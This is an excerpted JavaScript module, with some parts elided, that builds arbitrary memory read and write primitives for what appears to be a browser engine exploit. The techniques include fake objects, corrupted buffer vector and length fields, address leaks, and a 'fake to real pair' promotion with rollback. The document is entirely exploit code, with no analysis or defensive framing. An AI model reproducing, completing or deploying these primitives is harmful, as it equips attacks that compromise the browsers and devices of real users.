...
function read1(addr) { aimFor(addr, 1); try { return carrier.view[0]; } finally { carrier.restore(); } }
function read2(addr) { aimFor(addr, 2); try { const v = carrier.view; return v[0] | (v[1] << 8); } finally { carrier.restore(); } }
function read4(addr) {
    aimFor(addr, 4);
    try { const v = carrier.view;
...
function write1(addr, value) {
    ...
    aimFor(addr, 1);
    try { carrier.view[0] = v; } finally { carrier.restore(); }
}
function write2(addr, value) {
    const v = valueLow32(value, "mem.write2") & 0xffff;
    aimFor(addr, 2);
    try { const view = carrier.view;
        view[0] = v & 0xff; view[1] = (v >>> 8) & 0xff;
    } finally { carrier.restore(); }
}
function write4(addr, value) {
    ...
    try { const view = carrier.view;
        view[0] = v & 0xff; view[1] = (v >>> 8) & 0xff;
        view[2] = (v >>> 16) & 0xff; view[3] = (v >>> 24) & 0xff;
    } finally { carrier.restore(); }
}
function write8(addr, value) {
    let lo, hi;
    if (value instanceof int64) { lo = value.low >>> 0; hi = value.hi >>> 0; }
        ...
        if (value < 0) {
            ...
            lo = value >>> 0; hi = 0xffffffff;
        } else if (value <= 0xffffffff) { lo = value >>> 0; hi = 0; }
        else throw new RangeError(`mem.write8: ${value} exceeds 32 bits -- pass an int64`);
    } else if (value !== null && typeof value === "object" && "low" in value) {
        const n = toI64(value); lo = n.low; hi = n.hi;
    } else throw new TypeError("mem.write8: value must be int64 or number");
    aimFor(addr, 8);
    try { const view = carrier.view;
...
function readInto(dest, addr, count) {
    ...
    while (done < count) {
        ...
        try { for (let i = 0; i < chunk; ++i) dest[done + i] = carrier.view[i]; }
        finally { carrier.restore(); }
        done += chunk;
    }
    return dest;
...
let mainView = null, workerBuffer = null, workerView = null, workerMirror = null;
let pairVectorOffset = -1;
const retained = [];
export const pairStatus = {
    state: "not-attempted", promoted: false, committed: false,
    rolledBack: false, rollbackClean: null, fallback: false,
    stage: "not-attempted", failedAt: null, error: null,
    vectorOffset: -1, lengthOffset: -1, modeOffset: -1, butterflyOffset: -1,
    mainAddress: null, mainVector: null, mainRecordVector: null,
    mainWindow: -1, mainCellFromFakeSlot: null, mainIdentity: null, mainAtHome: null,
    workerAddress: null, workerVector: null, workerButterfly: null,
    workerWindow: -1, workerLength: -1, workerIdentity: null,
    structureID: -1, mode: -1, leakvalAgrees: false,
    fakeAddress: null, fakeButterfly: null, released: []
};
function u32At(b, o) { return (b[o] | (b[o+1]<<8) | (b[o+2]<<16) | (b[o+3]<<24)) >>> 0; }
function low48At(b, o) {
    return b[o] + b[o+1]*0x100 + b[o+2]*0x10000 + b[o+3]*0x1000000
        + b[o+4]*0x100000000 + b[o+5]*0x10000000000;
}
function canonical48(b, o) { return b[o+6] === 0 && b[o+7] === 0; }
function sameBytes(l, r, c) {
    for (let i = 0; i < c; ++i) if (l[i] !== r[i]) return false;
    return true;
}
function hexOf(b, c) {
    let o = "";
    for (let i = 0; i < c; ++i) o += (b[i] & 0xff).toString(16).padStart(2, "0");
    return o;
}
...
function buildPairCarrier(fake) {
    ...
    return {
        ...
        holder: fake.holder, holderAddress: fake.holderAddress,
        leakSlotOffset: fake.leakSlotOffset, leakSlotAddress: fake.leakSlotAddress,
        setLeakSlot: fake.setLeakSlot, clearLeakSlot: fake.clearLeakSlot,
        anchorObject: fake.anchorObject, anchorObjectAddress: fake.anchorObjectAddress,
        textarea: fake.textarea, textareaAddress: fake.textareaAddress,
        profile: fake.profile, attempts: fake.attempts, validate,
        hostAddress: fake.hostAddress, fakeAddress: fake.fakeAddress,
        pair: pairStatus,
        assertHome() {
...
function brokenCarrier(why) {
    ...
    return {
        ...
        validate: () => false, assertHome: () => false,
        profile: null, pair: pairStatus
    };
}
function proveMagic(note, who, slot, at, expected, context) {
    const target = toI64(at);
    const record = { at: target, expected: hexOf(expected, 8), found: null, pass: false };
...
export function promoteToRealPair(onEvent) {
    ...
    try {
        ...
        for (let i = 0; i < 8; ++i) workerMirror[PAIR_IDENT_OFFSET + i] = workerMagic[i];
        ...
        for (let i = 0; i < 8; ++i) workerOriginalVector[i] = workerHeader[VECTOR_OFF + i];
        for (let i = 0; i < 4; ++i) workerOriginalLength[i] = workerHeader[LENGTH_OFF + i];
        ...
        for (let i = 0; i < 4; ++i) mainView[LENGTH_OFF + i] = 0xff;
        ...
        if (committed) {
            ...
            try {
                for (let i = 0; i < 8; ++i) mainView[VECTOR_OFF + i] = workerOriginalVector[i];
                for (let i = 0; i < 4; ++i) mainView[LENGTH_OFF + i] = workerOriginalLength[i];
            } catch { clean = false; }
            ...
            try {
                if (!(workerView.length === WORKER_BUFFER_SIZE
                    ...
                    && fake.assertHome() === true)) clean = false;
            } catch { clean = false; }
        ...
        if (pairStatus.state === "broken") carrier = brokenCarrier(pairStatus.error);
        else if (rebound) carrier = fake;
        pairVectorOffset = -1;
        workerView = null; workerMirror = null; workerBuffer = null; mainView = null;
...
export function installWindowP(c, options) {
    ...
    try {
        ...
        if (opts.onEvent) opts.onEvent("PAIR-PROMOTE-FAILED", e.message);
        try {
            if (carrier && typeof carrier.assertHome === "function" && carrier.assertHome()) {
                releaseFakeCell();
                pairStatus.fallback = true;
                pairStatus.state = "fake";
                pairStatus.error = e.message;
                if (opts.onEvent) opts.onEvent("PAIR-FALLBACK", "promotion retry failed, using fake");
            }
        } catch (e2) {
            throw new Error("mem: promotion failed and retry also failed: " + e2.message);
        }
    }
    return prim;
}
export {
    ...
    leakval, readInto, toI64, addrNumber, int64
};